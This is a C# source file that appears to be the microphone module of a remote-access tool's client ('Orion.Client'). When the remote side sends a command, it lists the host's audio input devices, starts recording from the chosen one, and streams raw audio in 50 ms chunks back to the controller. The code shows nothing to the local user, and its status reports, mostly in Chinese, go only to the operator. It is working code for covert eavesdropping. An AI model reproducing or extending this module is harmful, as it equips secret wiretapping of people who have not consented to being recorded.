using NAudio.CoreAudioApi;
using NAudio.Wave;
using Orion.Common.Messages;
using Orion.Common.Messages.Audio;
using Orion.Common.Messages.Other;
using Orion.Common.Networking;
using System;
using System.Collections.Generic;

namespace Orion.Client.Messages
{
    public class AudioHandler : NotificationMessageProcessor, IDisposable
    {
        public override bool CanExecute(IMessage message) => message is GetMicrophone ||
                                                             message is GetMicrophoneDevice;

        public override bool CanExecuteFrom(ISender sender) => true;

        public ISender _client;

        private bool _isStarted;

        public WaveInEvent _audioDevice;

        private int _deviceID;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophone msg:
                    Execute(sender, msg);
                    break;

                case GetMicrophoneDevice msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetMicrophone message)
        {
            if (message.CreateNew)
            {
                try
                {
                    _isStarted = false;
                    _audioDevice?.Dispose();
                    OnReport("音频串流已启动");
                }
                catch (Exception ex)
                {
                    OnReport($"音频设备清理出错: {ex.Message}");
                }
            }
            if (message.Destroy)
            {
                try
                {
                    Destroy();
                    OnReport("音频串流已停止");
                }
                catch (Exception ex)
                {
                    OnReport($"停止音频时出错: {ex.Message}");
                }
                return;
            }
            if (_client == null) _client = client;
            if (!_isStarted)
            {
                try
                {
                    _deviceID = message.DeviceIndex;

                    if (_deviceID < 0 || _deviceID >= WaveIn.DeviceCount)
                    {
                        OnReport($"无效的麦克风设备索引: {_deviceID}。可用设备数: {WaveIn.DeviceCount}");
                        return;
                    }
                    var capabilities = WaveIn.GetCapabilities(_deviceID);
                    if (capabilities.Channels == 0)
                    {
                        OnReport($"麦克风设备 {_deviceID} 没有可用通道");
                        return;
                    }

                    OnReport($"正在初始化麦克风设备 {_deviceID}: {capabilities.ProductName}");

                    _audioDevice = new WaveInEvent
                    {
                        DeviceNumber = _deviceID,
                        WaveFormat = new WaveFormat(message.Bitrate, capabilities.Channels)
                    };
                    _audioDevice.BufferMilliseconds = 50;
                    _audioDevice.DataAvailable += sourcestream_DataAvailable;
                    _audioDevice.StartRecording();
                    _isStarted = true;
                }
                catch (ArgumentOutOfRangeException ex)
                {
                    OnReport($"Device index out of range: {ex.Message}");
                    _isStarted = false;
                }
                catch (InvalidOperationException ex)
                {
                    OnReport($"无效的麦克风操作: {ex.Message}");
                    _isStarted = false;
                }
                catch (System.Runtime.InteropServices.COMException ex)
                {
                    OnReport($"访问麦克风时发生COM错误: {ex.Message}");
                    _isStarted = false;
                }
                catch (UnauthorizedAccessException ex)
                {
                    OnReport($"无权访问麦克风: {ex.Message}");
                    _isStarted = false;
                }
                catch (Exception ex)
                {
                    OnReport($"初始化麦克风时发生意外错误: {ex.Message}");
                    _isStarted = false;
                }
            }
        }

        private void sourcestream_DataAvailable(object notUsed, WaveInEventArgs e)
        {
            try
            {
                if (e?.Buffer == null || e.BytesRecorded <= 0)
                {
                    return;
                }

                byte[] rawAudio = new byte[e.BytesRecorded];
                Array.Copy(e.Buffer, rawAudio, e.BytesRecorded);

                _client?.Send(new GetMicrophoneResponse
                {
                    Audio = rawAudio,
                    Device = _deviceID
                });
            }
            catch (Exception ex)
            {
                OnReport($"Error processing microphone data: {ex.Message}");
            }
        }

        private void Execute(ISender client, GetMicrophoneDevice message)
        {
            try
            {
                var deviceList = new List<Tuple<int, string>>();

                int deviceCount = WaveIn.DeviceCount;
                for (int i = 0; i < deviceCount; i++)
                {
                    try
                    {
                        var capabilities = WaveIn.GetCapabilities(i);
                        string deviceName = capabilities.ProductName;

                        OnReport($"发现麦克风设备 {i}: {deviceName} (通道数: {capabilities.Channels})");

                        if (!string.IsNullOrEmpty(deviceName) && capabilities.Channels > 0)
                        {
                            deviceList.Add(Tuple.Create(i, deviceName));
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"访问麦克风设备 {i} 时出错: {ex.Message}");
                    }
                }

                client.Send(new GetMicrophoneDeviceResponse { DeviceInfos = deviceList });
            }
            catch (Exception ex)
            {
                OnReport($"枚举麦克风设备时出错: {ex.Message}");
                client.Send(new GetMicrophoneDeviceResponse { DeviceInfos = new List<Tuple<int, string>>() });
            }
        }

        public void Destroy()
        {
            try
            {
                if (_audioDevice != null)
                {
                    try
                    {
                        _audioDevice.DataAvailable -= sourcestream_DataAvailable;
                    }
                    catch (Exception ex)
                    {
                        OnReport($"取消订阅 DataAvailable 事件时出错: {ex.Message}");
                    }

                    try
                    {
                        if (_audioDevice.DeviceNumber >= 0) // Check if device is valid
                        {
                            _audioDevice.StopRecording();
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"停止麦克风录制时出错: {ex.Message}");
                    }

                    try
                    {
                        _audioDevice.Dispose();
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error disposing microphone device: {ex.Message}");
                    }

                    _audioDevice = null;
                }
            }
            catch (Exception ex)
            {
                OnReport($"Destroy 方法中出错: {ex.Message}");
            }
            finally
            {
                _isStarted = false;
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    Destroy();
                }
                catch (Exception ex)
                {
                    OnReport($"释放资源时出错: {ex.Message}");
                }
            }
        }
    }
}